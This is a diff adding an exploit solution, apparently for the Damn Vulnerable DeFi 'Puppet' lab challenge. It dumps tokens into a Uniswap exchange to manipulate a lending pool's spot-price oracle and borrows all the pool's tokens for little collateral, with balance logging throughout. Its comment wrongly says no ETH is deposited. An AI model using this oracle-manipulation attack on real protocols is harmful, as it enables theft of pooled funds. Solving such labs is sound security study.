@@ -103,6 +103,67 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+    console.log("[Before]");
+        console.log("- Attacker");
+        console.log("Attacker ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString()); // attacker ETH
+        console.log("Attacker DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString()); // attacker DTV
+        console.log("- Lending Pool");
+        console.log("Lending Pool ETH: " + (ethers.utils.formatEther(await ethers.provider.getBalance(this.lendingPool.address))).toString()); // lendingPool ETH
+        console.log("Lending Pool DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address))).toString());  // lendingPool DTV
+        console.log("- Uniswap Exchange");
+        console.log("Uniswasp ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address))).toString()); // exchange ETH
+        console.log("Uniswap DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address))).toString()); // exchange DTV
+    
+    // Swap all attacker's initial tokens for ether to dump price.
+    await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+    await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), // [lest 1wei to pass success conditions]. (tokens_sold)
+            1,                                     // min_eth
+            (await ethers.provider.getBlock('latest')).timestamp * 2 //deadline                   
+    );
+
+    /* From the function in PuppetPool
+        function _computeOraclePrice() private view returns (uint256) {
+        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
+    }
+    After attacker sell all DVT token, it make exchange has DVT more than previous ratio that 
+    Uniswasp ETH and DVT is 10:10 but now 0.09:1009
+    Remember that the division in smart contracts is an integer division, even the SafeMath
+    It means that hen you divide A by B while A is smaller than B, the result is zero!
+
+    So, when check depositRequired, it will be equal to zero too.Because:
+    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
+        return amount * _computeOraclePrice() * 2 / 10 ** 18;
+    }
+    Amount now is 19,it means 19*0=0
+    I borrow all DVT tokens from the pool without depositing any ETH.
+    */
+
+    console.log("[Attacker sell all DVT token to exchange]");
+        console.log("- Attacker");
+        console.log("Attacker ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString()); // attacker ETH
+        console.log("Attacker DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString()); // attacker DTV
+        console.log("- Uniswap Exchange");
+        console.log("Uniswasp ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address))).toString()); // exchange ETH
+        console.log("Uniswap DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address))).toString()); // exchange DTV
+    
+    // Calculate how much collateral we now need to borrow all tokens with the price being manipulated.
+    const collateral = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE); // It's about 19 ether
+    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: collateral });
+
+    console.log("[After]");
+        console.log("- Calculate Ratio")
+        console.log("Deposit required : " + (ethers.utils.formatEther(collateral).toString()));
+        console.log("- Attacker");
+        console.log("Attacker ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))).toString()); // attacker ETH
+        console.log("Attacker DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(attacker.address))).toString()); // attacker DTV
+        console.log("- Lending Pool");
+        console.log("Lending Pool ETH: " + (ethers.utils.formatEther(await ethers.provider.getBalance(this.lendingPool.address))).toString()); // lendingPool ETH
+        console.log("Lending Pool DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address))).toString());  // lendingPool DTV
+        console.log("- Uniswap Exchange");
+        console.log("Uniswasp ETH: " +(ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address))).toString()); // exchange ETH
+        console.log("Uniswap DVT: " +(ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address))).toString()); // exchange DTV
     });
 
     after(async function () {
